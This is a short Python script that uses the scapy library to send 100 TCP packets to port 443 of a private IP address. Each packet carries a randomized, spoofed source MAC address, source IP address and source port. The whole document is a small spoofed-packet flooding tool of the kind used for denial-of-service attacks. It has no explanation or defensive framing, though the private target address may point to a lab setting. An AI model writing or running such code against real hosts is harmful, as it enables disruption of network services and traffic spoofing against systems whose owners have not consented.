from scapy.all import IP, TCP, sendp, RandIP, RandShort, RandMAC, Ether

targetIP = "10.100.102.201"
targetPort = 443

sendp(Ether(src=RandMAC(), dst=RandMAC())/IP(dst=targetIP, src=RandIP())/TCP(dport=targetPort, sport=RandShort()),count = 100)
